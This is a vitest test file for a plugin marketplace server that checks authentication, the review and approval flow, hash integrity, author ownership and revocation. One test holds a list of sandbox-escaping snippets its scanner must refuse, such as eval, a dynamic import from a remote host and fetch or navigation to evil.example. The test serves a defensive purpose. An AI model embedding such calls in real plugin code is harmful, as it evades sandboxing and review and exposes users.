import { mkdtempSync, rmSync } from 'node:fs';
import type { AddressInfo } from 'node:net';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import type { Source } from '../../client/sources.js';
import { downloadPlugin, listPlugins, pluginDetail } from '../client/api.js';
import { examplePackage } from '../dev/examples.js';
import { readPluginConfig } from './config.js';
import { createPluginApp } from './http.js';
import { PluginStore } from './store.js';

let dir: string;
let store: PluginStore;
let base: string;
let ada: string;
let eve: string;
let close: () => void;
let source: Source;

beforeAll(async () => {
  dir = mkdtempSync(join(tmpdir(), 'plugins-'));
  store = new PluginStore(dir);
  ada = store.createAuthor('Ada', 20).token;
  eve = store.createAuthor('Eve', 20).token;
  const server = createPluginApp({ ...readPluginConfig({}), dataDir: dir }, store, ['badword']);
  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
  base = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
  source = { url: base, name: 'Test', enabled: true };
  close = () => server.close();
});

afterAll(() => {
  close();
  store.close();
  rmSync(dir, { recursive: true, force: true });
});

const upload = async (bytes: Uint8Array, token = ada) => {
  const response = await fetch(`${base}/v1/plugins`, {
    method: 'POST',
    body: bytes as BodyInit,
    headers: { Authorization: `Bearer ${token}` },
  });
  return { status: response.status, body: (await response.json()) as { error?: string } };
};

const pendingId = (plugin: string, version: string) =>
  String(
    store.byStatus('pending').find((v) => v.plugin === plugin && v.version === version)?.version_id,
  );

describe('plugin server', () => {
  it('needs a token', async () => {
    expect((await upload(await examplePackage('model-stats'), 'x'.repeat(30))).status).toBe(401);
  });

  it('refuses code that would slip past the sandbox or past review', async () => {
    const cases: [string, string][] = [
      ['eval("1")', 'eval'],
      ['const f = new Function("x")', 'Function'],
      ['await import("https://x.example/a.js")', 'dynamic import'],
      ['window.parent.postMessage("x", "*")', 'other windows'],
      ['document.location = "https://evil.example"', 'navigation'],
      ['const s = "</scr" + "ipt>"; const t = "</script>"', '</script'],
      ['fetch("https://evil.example")', 'network'],
      [`const x = "${'a'.repeat(1200)}";`, 'minified'],
    ];
    for (const [code, expected] of cases) {
      const { status, body } = await upload(await examplePackage('model-stats', (m) => m, code));
      expect(status, code).toBe(422);
      expect(body.error, code).toContain(expected);
    }
    const named = await upload(
      await examplePackage('model-stats', (m) => ({ ...m, name: 'Badword tool' })),
    );
    expect(named.body.error).toContain('name');
  });

  it('keeps a plugin hidden until approved, then serves exactly what was reviewed', async () => {
    expect((await upload(await examplePackage('model-stats'))).status).toBe(202);
    expect((await listPlugins(source, {})).plugins).toEqual([]);

    await store.setStatus(pendingId('bezier.model-stats', '1.0.0'), 'approved');
    const [entry] = (await listPlugins(source, { q: 'statistics' })).plugins;
    if (entry === undefined) throw new Error('missing');
    expect(entry.permissions).toEqual(['project:read', 'ui:panel', 'ui:command']);
    expect(entry.author).toBe('Ada');

    const plugin = await downloadPlugin(source, entry);
    expect(plugin.manifest.id).toBe('bezier.model-stats');
    expect(plugin.code).toContain('bezier.project.read');
    await expect(downloadPlugin(source, { ...entry, sha256: '0'.repeat(64) })).rejects.toThrow(
      'intact',
    );
  });

  it('keeps an id with its first author and versions only going up', async () => {
    const stolen = await upload(
      await examplePackage('model-stats', (m) => ({ ...m, pluginVersion: '9.0.0' })),
      eve,
    );
    expect(stolen.status).toBe(409);
    expect(stolen.body.error).toContain('another author');
    const replay = await upload(await examplePackage('model-stats'));
    expect(replay.status).toBe(409);
    expect(replay.body.error).toContain('Raise the version');
  });

  it('announces revoked versions and filters plugins that use the network', async () => {
    const networked = await examplePackage('json-export', (m) => ({
      ...m,
      permissions: [...m.permissions, 'network'],
      network: ['https://api.example.org'],
    }));
    expect((await upload(networked)).status).toBe(202);
    await store.setStatus(pendingId('bezier.json-export', '1.2.0'), 'approved');
    expect((await listPlugins(source, {})).plugins).toHaveLength(2);
    expect((await listPlugins(source, { offline: true })).plugins.map((p) => p.id)).toEqual([
      'bezier.model-stats',
    ]);
    const approved = store.byStatus('approved').find((v) => v.plugin === 'bezier.json-export');
    await store.setStatus(String(approved?.version_id), 'revoked', 'test');
    const detail = await pluginDetail(source, 'bezier.json-export');
    expect(detail).toEqual({ plugin: null, revoked: ['1.2.0'] });
  });
});
